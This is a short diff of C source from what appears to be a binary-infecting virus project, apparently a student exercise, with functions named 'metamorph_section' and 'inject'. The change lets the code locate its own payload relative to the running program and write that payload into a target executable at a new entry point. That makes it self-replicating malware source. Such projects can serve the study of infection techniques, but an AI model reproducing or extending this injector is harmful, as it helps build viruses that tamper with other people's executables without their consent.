@@ -68,6 +68,7 @@ int FORCE_INLINE metamorph_section(t_data data)
 int inject(t_data data)
 {
 	u64 offset;
+	u64 payload_addr;
 
 	ft_putchar('3');
 	ft_putchar('\n');
@@ -83,7 +84,8 @@ int inject(t_data data)
 	offset = LSEEK(data.fd, 0, SEEK_END);
 	WRITE(data.fd, "\x00\x00\x00\x00", data.bin.new_entry - data.bin.v_addr - offset);
 	/* write to file */
-	WRITE(data.fd, &payload, data.infos.pl_size);
+	payload_addr = get_rel_addr() - ((void*)&get_rel_addr - (void*)&payload);
+	WRITE(data.fd, payload_addr, data.infos.pl_size);
 	CLOSE(data.fd);
 	ft_putchar('6');
 	ft_putchar('\n');
